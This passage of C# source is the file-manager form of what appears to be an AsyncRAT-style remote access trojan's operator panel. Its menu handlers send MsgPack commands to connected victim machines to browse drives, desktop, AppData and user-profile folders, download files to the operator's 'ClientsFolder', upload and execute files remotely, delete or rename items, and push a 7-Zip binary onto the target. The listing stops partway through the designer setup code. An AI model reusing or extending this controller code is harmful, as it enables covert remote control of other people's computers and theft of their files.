using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using DevExpress.Utils;
using DevExpress.XtraBars;
using DevExpress.XtraEditors;
using DevExpress.XtraTab;
using MessagePackLib.MessagePack;
using Microsoft.VisualBasic;
using Server.Connection;
using Server.Properties;

namespace Server.Forms;

public class FormFileManager : XtraForm
{
	private IContainer components;

	public ListView listViewExplorer;

	public ImageList imageList1;

	public StatusStrip statusStrip1;

	public ToolStripStatusLabel toolStripStatusLabel1;

	public ToolStripStatusLabel toolStripStatusLabel2;

	public ToolStripStatusLabel toolStripStatusLabel3;

	public System.Windows.Forms.Timer timer1;

	private ColumnHeader columnHeader1;

	private ColumnHeader columnHeader2;

	private PopupMenu popupMenuFileManager;

	private BarButtonItem BackMenu;

	private BarButtonItem RefreshMenu;

	private BarSubItem barSubItem1;

	private BarButtonItem GotoDesktopMenu;

	private BarButtonItem GotoAppDataMenu;

	private BarButtonItem GotoUserProfileMenu;

	private BarButtonItem GotoDriversMenu;

	private BarButtonItem DownloadMenu;

	private BarButtonItem UploadMenu;

	private BarButtonItem ExecuteMenu;

	private BarButtonItem RenameMenu;

	private BarButtonItem CopyMenu;

	private BarButtonItem CutMenu;

	private BarButtonItem PasteMenu;

	private BarSubItem barSubItem2;

	private BarButtonItem InstallZipMenu;

	private BarButtonItem ZipFolderMenu;

	private BarButtonItem UnzipMenu;

	private BarButtonItem MakeNewFolderMenu;

	private BarButtonItem OpenClientFolderMenu;

	private BarManager barManager1;

	private BarDockControl barDockControlTop;

	private BarDockControl barDockControlBottom;

	private BarDockControl barDockControlLeft;

	private BarDockControl barDockControlRight;

	private BarButtonItem DeleteMenu;

	private XtraTabControl xtraTabControl1;

	private XtraTabPage xtraTabPage1;

	public FormMain F { get; set; }

	internal Clients Client { get; set; }

	public string FullPath { get; set; }

	public FormFileManager()
	{
		InitializeComponent();
	}

	private void listView1_DoubleClick(object sender, EventArgs e)
	{
		try
		{
			if (listViewExplorer.SelectedItems.Count == 1)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = listViewExplorer.SelectedItems[0].ToolTipText;
				listViewExplorer.Enabled = false;
				toolStripStatusLabel3.ForeColor = Color.Green;
				toolStripStatusLabel3.Text = "Please Wait";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
		catch
		{
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!Client.TcpClient.Connected)
			{
				Close();
			}
		}
		catch
		{
			Close();
		}
	}

	private void FormFileManager_FormClosed(object sender, FormClosedEventArgs e)
	{
		ThreadPool.QueueUserWorkItem(delegate
		{
			Client?.Disconnected();
		});
	}

	private void listViewExplorer_MouseUp(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			popupMenuFileManager.ShowPopup(listViewExplorer.PointToScreen(e.Location));
		}
	}

	private void GotoAppDataMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "getPath";
			msgPack.ForcePathObject("Path").AsString = "APPDATA";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
		catch
		{
		}
	}

	private void BackMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			string text = toolStripStatusLabel1.Text;
			if (text.Length <= 3)
			{
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getDrivers";
				toolStripStatusLabel1.Text = "";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
			else
			{
				text = text.Remove(text.LastIndexOfAny(new char[1] { '\\' }, text.LastIndexOf('\\')));
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = text + "\\";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
		catch
		{
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
			msgPack2.ForcePathObject("Command").AsString = "getDrivers";
			toolStripStatusLabel1.Text = "";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
		}
	}

	private void CopyMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			if (listViewExplorer.SelectedItems.Count <= 0)
			{
				return;
			}
			StringBuilder stringBuilder = new StringBuilder();
			foreach (ListViewItem selectedItem in listViewExplorer.SelectedItems)
			{
				stringBuilder.Append(selectedItem.ToolTipText + "-=>");
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "copyFile";
			msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
			msgPack.ForcePathObject("IO").AsString = "copy";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
		catch
		{
		}
	}

	private void CutMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			if (listViewExplorer.SelectedItems.Count <= 0)
			{
				return;
			}
			StringBuilder stringBuilder = new StringBuilder();
			foreach (ListViewItem selectedItem in listViewExplorer.SelectedItems)
			{
				stringBuilder.Append(selectedItem.ToolTipText + "-=>");
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "copyFile";
			msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
			msgPack.ForcePathObject("IO").AsString = "cut";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
		catch
		{
		}
	}

	private void GotoDesktopMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "getPath";
			msgPack.ForcePathObject("Path").AsString = "DESKTOP";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
		catch
		{
		}
	}

	private void DownloadMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			if (listViewExplorer.SelectedItems.Count <= 0)
			{
				return;
			}
			if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + Client.ID)))
			{
				Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + Client.ID));
			}
			foreach (ListViewItem selectedItem in listViewExplorer.SelectedItems)
			{
				if (selectedItem.ImageIndex == 0 && selectedItem.ImageIndex == 1 && selectedItem.ImageIndex == 2)
				{
					break;
				}
				MsgPack msgPack = new MsgPack();
				string dwid = Guid.NewGuid().ToString();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "socketDownload";
				msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
				msgPack.ForcePathObject("DWID").AsString = dwid;
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				BeginInvoke((MethodInvoker)delegate
				{
					if ((FormDownloadFile)Application.OpenForms["socketDownload:" + dwid] == null)
					{
						FormDownloadFile formDownloadFile = new FormDownloadFile();
						formDownloadFile.Name = "socketDownload:" + dwid;
						formDownloadFile.Text = "SocketDownload from " + Client.Ip;
						formDownloadFile.F = F;
						formDownloadFile.DirPath = FullPath;
						formDownloadFile.Show();
					}
				});
			}
		}
		catch
		{
		}
	}

	private void GotoDriversMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
		msgPack.ForcePathObject("Command").AsString = "getDrivers";
		toolStripStatusLabel1.Text = "";
		ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
	}

	private void ExecuteMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			if (listViewExplorer.SelectedItems.Count <= 0)
			{
				return;
			}
			foreach (ListViewItem selectedItem in listViewExplorer.SelectedItems)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "execute";
				msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
		catch
		{
		}
	}

	private void InstallZipMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
		msgPack.ForcePathObject("Command").AsString = "installZip";
		msgPack.ForcePathObject("exe").SetAsBytes(Resources._7z);
		msgPack.ForcePathObject("dll").SetAsBytes(Resources._7z1);
		ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
	}

	private void MakeNewFolderMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			string text = Interaction.InputBox("Create Folder", "Name", Path.GetRandomFileName().Replace(".", ""));
			if (!string.IsNullOrEmpty(text))
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "createFolder";
				msgPack.ForcePathObject("Folder").AsString = Path.Combine(toolStripStatusLabel1.Text, text);
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
		catch
		{
		}
	}

	private void OpenClientFolderMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			if (!Directory.Exists(FullPath))
			{
				Directory.CreateDirectory(FullPath);
			}
			Process.Start(FullPath);
		}
		catch
		{
		}
	}

	private void PasteMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "pasteFile";
			msgPack.ForcePathObject("File").AsString = toolStripStatusLabel1.Text;
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
		catch
		{
		}
	}

	private void RefreshMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			if (toolStripStatusLabel1.Text != "")
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = toolStripStatusLabel1.Text;
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
			else
			{
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack2.ForcePathObject("Command").AsString = "getDrivers";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
			}
		}
		catch
		{
		}
	}

	private void RenameMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		if (listViewExplorer.SelectedItems.Count != 1)
		{
			return;
		}
		try
		{
			string text = Interaction.InputBox("Rename File or Folder", "Name", listViewExplorer.SelectedItems[0].Text);
			if (!string.IsNullOrEmpty(text))
			{
				if (listViewExplorer.SelectedItems[0].ImageIndex != 0 && listViewExplorer.SelectedItems[0].ImageIndex != 1 && listViewExplorer.SelectedItems[0].ImageIndex != 2)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "renameFile";
					msgPack.ForcePathObject("File").AsString = listViewExplorer.SelectedItems[0].ToolTipText;
					msgPack.ForcePathObject("NewName").AsString = Path.Combine(toolStripStatusLabel1.Text, text);
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				}
				else if (listViewExplorer.SelectedItems[0].ImageIndex == 0)
				{
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack2.ForcePathObject("Command").AsString = "renameFolder";
					msgPack2.ForcePathObject("Folder").AsString = listViewExplorer.SelectedItems[0].ToolTipText + "\\";
					msgPack2.ForcePathObject("NewName").AsString = Path.Combine(toolStripStatusLabel1.Text, text);
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch
		{
		}
	}

	private void UnzipMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			if (listViewExplorer.SelectedItems.Count <= 0)
			{
				return;
			}
			foreach (ListViewItem selectedItem in listViewExplorer.SelectedItems)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "zip";
				msgPack.ForcePathObject("Path").AsString = selectedItem.ToolTipText;
				msgPack.ForcePathObject("Zip").AsString = "false";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
		catch
		{
		}
	}

	private void UploadMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		if (toolStripStatusLabel1.Text.Length < 3)
		{
			return;
		}
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Multiselect = true;
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string[] fileNames = openFileDialog.FileNames;
			foreach (string text in fileNames)
			{
				FormDownloadFile formDownloadFile = (FormDownloadFile)Application.OpenForms["socketDownload:"];
				if (formDownloadFile == null)
				{
					formDownloadFile = new FormDownloadFile
					{
						Name = "socketUpload:" + Guid.NewGuid().ToString(),
						Text = "socketUpload:" + Client.ID,
						F = Program.mainform,
						Client = Client
					};
					formDownloadFile.FileSize = new FileInfo(text).Length;
					formDownloadFile.labelfile.Text = Path.GetFileName(text);
					formDownloadFile.FullFileName = text;
					formDownloadFile.label1.Text = "Upload:";
					formDownloadFile.ClientFullFileName = toolStripStatusLabel1.Text + "\\" + Path.GetFileName(text);
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "reqUploadFile";
					msgPack.ForcePathObject("ID").AsString = formDownloadFile.Name;
					formDownloadFile.Show();
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch
		{
		}
	}

	private void GotoUserProfileMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "getPath";
			msgPack.ForcePathObject("Path").AsString = "USER";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
		catch
		{
		}
	}

	private void ZipFolderMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			if (listViewExplorer.SelectedItems.Count <= 0)
			{
				return;
			}
			StringBuilder stringBuilder = new StringBuilder();
			foreach (ListViewItem selectedItem in listViewExplorer.SelectedItems)
			{
				stringBuilder.Append(selectedItem.ToolTipText + "-=>");
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "zip";
			msgPack.ForcePathObject("Path").AsString = stringBuilder.ToString();
			msgPack.ForcePathObject("Zip").AsString = "true";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
		catch
		{
		}
	}

	private void DeleteMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			if (listViewExplorer.SelectedItems.Count <= 0)
			{
				return;
			}
			foreach (ListViewItem selectedItem in listViewExplorer.SelectedItems)
			{
				if (selectedItem.ImageIndex != 0 && selectedItem.ImageIndex != 1 && selectedItem.ImageIndex != 2)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "deleteFile";
					msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				}
				else if (selectedItem.ImageIndex == 0)
				{
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack2.ForcePathObject("Command").AsString = "deleteFolder";
					msgPack2.ForcePathObject("Folder").AsString = selectedItem.ToolTipText;
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.ListViewGroup listViewGroup = new System.Windows.Forms.ListViewGroup("Folders", System.Windows.Forms.HorizontalAlignment.Left);
		System.Windows.Forms.ListViewGroup listViewGroup2 = new System.Windows.Forms.ListViewGroup("File", System.Windows.Forms.HorizontalAlignment.Left);
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormFileManager));
		this.listViewExplorer = new System.Windows.Forms.ListView();
		this.columnHeader1 = new System.Windows.Forms.ColumnHeader();
		this.columnHeader2 = new System.Windows.Forms.ColumnHeader();
		this.imageList1 = new System.Windows.Forms.ImageList(this.components);
		this.statusStrip1 = new System.Windows.Forms.StatusStrip();
		this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
		this.toolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
		this.toolStripStatusLabel3 = new System.Windows.Forms.ToolStripStatusLabel();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.popupMenuFileManager = new DevExpress.XtraBars.PopupMenu(this.components);
		this.BackMenu = new DevExpress.XtraBars.BarButtonItem();
		this.RefreshMenu = new DevExpress.XtraBars.BarButtonItem();
		this.barSubItem1 = new DevExpress.XtraBars.BarSubItem();
		this.GotoDesktopMenu = new DevExpress.XtraBars.BarButtonItem();
		this.GotoAppDataMenu = new DevExpress.XtraBars.BarButtonItem();
		this.GotoUserProfileMenu = new DevExpress.XtraBars.BarButtonItem();
		this.GotoDriversMenu = new DevExpress.XtraBars.BarButtonItem();
		this.DownloadMenu = new DevExpress.XtraBars.BarButtonItem();
		this.UploadMenu = new DevExpress.XtraBars.BarButtonItem();
		this.ExecuteMenu = new DevExpress.XtraBars.BarButtonItem();
		this.RenameMenu = new DevExpress.XtraBars.BarButtonItem();
		this.CopyMenu = new DevExpress.XtraBars.BarButtonItem();
		this.CutMenu = new DevExpress.XtraBars.BarButtonItem();
		this.PasteMenu = new DevExpress.XtraBars.BarButtonItem();
		this.DeleteMenu = new DevExpress.XtraBars.BarButtonItem();
		this.barSubItem2 = new DevExpress.XtraBars.BarSubItem();
		this.InstallZipMenu = new DevExpress.XtraBars.BarButtonItem();
		this.ZipFolderMenu = new DevExpress.XtraBars.BarButtonItem();
		this.UnzipMenu = new DevExpress.XtraBars.BarButtonItem();
		this.MakeNewFolderMenu = new DevExpress.XtraBars.BarButtonItem();
		this.OpenClientFolderMenu = new DevExpress.XtraBars.BarButtonItem();
		this.barManager1 = new DevExpress.XtraBars.BarManager(this.components);
		this.barDockControlTop = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlBottom = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlLeft = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlRight = new DevExpress.XtraBars.BarDockControl();
		this.xtraTabControl1 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage1 = new DevExpress.XtraTab.XtraTabPage();
		this.statusStrip1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.popupMenuFileManager).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.barManager1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).BeginInit();
		this.xtraTabControl1.SuspendLayout();
		this.xtraTabPage1.SuspendLayout();
		base.SuspendLayout();
		this.listViewExplorer.AllowColumnReorder = true;
		this.listViewExplorer.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
		this.listViewExplorer.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.listViewExplorer.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.columnHeader1, this.columnHeader2 });
		this.listViewExplorer.Dock = System.Windows.Forms.DockStyle.Fill;
		this.listViewExplorer.ForeColor = System.Drawing.Color.Gainsboro;
		listViewGroup.Header = "Folders";
		listViewGroup.Name = "Folders";
		listViewGroup2.Header = "File";
		listViewGroup2.Name = "File";
		this.listViewExplorer.Groups.AddRange(new System.Windows.Forms.ListViewGroup[2] { listViewGroup, listViewGroup2 });
		this.listViewExplorer.HideSelection = false;
		this.listViewExplorer.LargeImageList = this.imageList1;
		this.listViewExplorer.Location = new System.Drawing.Point(0, 0);
		this.listViewExplorer.Margin = new System.Windows.Forms.Padding(2);
		this.listViewExplorer.Name = "listViewExplorer";
		this.listViewExplorer.ShowItemToolTips = true;
		this.listViewExplorer.Size = new System.Drawing.Size(820, 379);
		this.listViewExplorer.SmallImageList = this.imageList1;
		this.listViewExplorer.TabIndex = 0;
		this.listViewExplorer.UseCompatibleStateImageBehavior = false;
		this.listViewExplorer.View = System.Windows.Forms.View.Tile;
		this.listViewExplorer.DoubleClick += new System.EventHandler(listView1_DoubleClick);
		this.listViewExplorer.MouseUp += new System.Windows.Forms.MouseEventHandler(listViewExplorer_MouseUp);
		this.imageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList1.ImageStream");
		this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
		this.imageList1.Images.SetKeyName(0, "AsyncFolder.ico");
		this.imageList1.Images.SetKeyName(1, "AsyncHDDFixed.png");
		this.imageList1.Images.SetKeyName(2, "AsyncUSB.png");
		this.statusStrip1.AutoSize = false;
		this.statusStrip1.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
		this.statusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.toolStripStatusLabel1, this.toolStripStatusLabel2, this.toolStripStatusLabel3 });
		this.statusStrip1.Location = new System.Drawing.Point(0, 410);
		this.statusStrip1.Name = "statusStrip1";
		this.statusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 10, 0);
		this.statusStrip1.Size = new System.Drawing.Size(822, 26);
		this.statusStrip1.SizingGrip = false;
		this.statusStrip1.TabIndex = 2;
		this.statusStrip1.Text = "statusStrip1";
		this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
		this.toolStripStatusLabel1.Size = new System.Drawing.Size(13, 21);
		this.toolStripStatusLabel1.Text = "..";
		this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
		this.toolStripStatusLabel2.Size = new System.Drawing.Size(13, 21);
		this.toolStripStatusLabel2.Text = "..";
		this.toolStripStatusLabel3.ForeColor = System.Drawing.Color.Red;
		this.toolStripStatusLabel3.Name = "toolStripStatusLabel3";
		this.toolStripStatusLabel3.Size = new System.Drawing.Size(13, 21);
		this.toolStripStatusLabel3.Text = "..";
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.popupMenuFileManager.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[14]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.BackMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.RefreshMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.barSubItem1),
			new DevExpress.XtraBars.LinkPersistInfo(this.DownloadMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.UploadMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.ExecuteMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.RenameMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.CopyMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.CutMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.PasteMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.DeleteMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.barSubItem2),
			new DevExpress.XtraBars.LinkPersistInfo(this.MakeNewFolderMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.OpenClientFolderMenu)
		});
		this.popupMenuFileManager.Manager = this.barManager1;
		this.popupMenuFileManager.Name = "popupMenuFileManager";
		this.BackMenu.Caption = "Back";
		this.BackMenu.Id = 0;
		this.BackMenu.Name = "BackMenu";
		this.BackMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(BackMenu_ItemClick);
		this.RefreshMenu.Caption = "Refresh";
		this.RefreshMenu.Id = 1;
		this.RefreshMenu.Name = "RefreshMenu";
		this.RefreshMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(RefreshMenu_ItemClick);
		this.barSubItem1.Caption = "Goto";
		this.barSubItem1.Id = 2;
		this.barSubItem1.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[4]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.GotoDesktopMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.GotoAppDataMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.GotoUserProfileMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.GotoDriversMenu)
		});
		this.barSubItem1.Name = "barSubItem1";
		this.GotoDesktopMenu.Caption = "Desktop";
		this.GotoDesktopMenu.Id = 13;
		this.GotoDesktopMenu.Name = "GotoDesktopMenu";
		this.GotoDesktopMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(GotoDesktopMenu_ItemClick);
		this.GotoAppDataMenu.Caption = "AppData";
		this.GotoAppDataMenu.Id = 17;
		this.GotoAppDataMenu.Name = "GotoAppDataMenu";
		this.GotoAppDataMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(GotoAppDataMenu_ItemClick);
		this.GotoUserProfileMenu.Caption = "User Profile";
		this.GotoUserProfileMenu.Id = 18;
		this.GotoUserProfileMenu.Name = "GotoUserProfileMenu";
		this.GotoUserProfileMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(GotoUserProfileMenu_ItemClick);
		this.GotoDriversMenu.Caption = "Drivers";
		this.GotoDriversMenu.Id = 19;
		this.GotoDriversMenu.Name = "GotoDriversMenu";
		this.GotoDriversMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(GotoDriversMenu_ItemClick);
		this.DownloadMenu.Caption = "Download";
		this.DownloadMenu.Id = 3;
		this.DownloadMenu.Name = "DownloadMenu";
		this.DownloadMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(DownloadMenu_ItemClick);
		this.UploadMenu.Caption = "Upload";
		this.UploadMenu.Id = 4;
		this.UploadMenu.Name = "UploadMenu";
		this.UploadMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(UploadMenu_ItemClick);
		this.ExecuteMenu.Caption = "Execute";
		this.ExecuteMenu.Id = 5;
		this.ExecuteMenu.Name = "ExecuteMenu";
		this.ExecuteMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(ExecuteMenu_ItemClick);
		this.RenameMenu.Caption = "Rename";
		this.RenameMenu.Id = 6;
		this.RenameMenu.Name = "RenameMenu";
		this.RenameMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(RenameMenu_ItemClick);
		this.CopyMenu.Caption = "Copy";
		this.CopyMenu.Id = 7;
		this.CopyMenu.Name = "CopyMenu";
		this.CopyMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(CopyMenu_ItemClick);
		this.CutMenu.Caption = "Cut";
		this.CutMenu.Id = 8;
		this.CutMenu.Name = "CutMenu";
		this.CutMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(CutMenu_ItemClick);
		this.PasteMenu.Caption = "Paste";
		this.PasteMenu.Id = 9;
		this.PasteMenu.Name = "PasteMenu";
		this.PasteMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(PasteMenu_ItemClick);
		this.DeleteMenu.Caption = "Delete";
		this.DeleteMenu.Id = 20;
		this.DeleteMenu.Name = "DeleteMenu";
		this.DeleteMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(DeleteMenu_ItemClick);
		this.barSubItem2.Caption = "7-Zip";
		this.barSubItem2.Id = 10;
		this.barSubItem2.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[3]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.InstallZipMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.ZipFolderMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.UnzipMenu)
		});
		this.barSubItem2.Name = "barSubItem2";
		this.InstallZipMenu.Caption = "Install";
		this.InstallZipMenu.Id = 14;
		this.InstallZipMenu.Name = "InstallZipMenu";
		this.InstallZipMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(InstallZipMenu_ItemClick);
		this.ZipFolderMenu.Caption = "Zip";
		this.ZipFolderMenu.Id = 15;
		this.ZipFolderMenu.Name = "ZipFolderMenu";
		this.ZipFolderMenu.ItemClick += new DevExpress.XtraBars.ItemClickEventHandler(ZipFolderMenu_ItemClick);
		this.UnzipMenu.Caption = "UnZip";
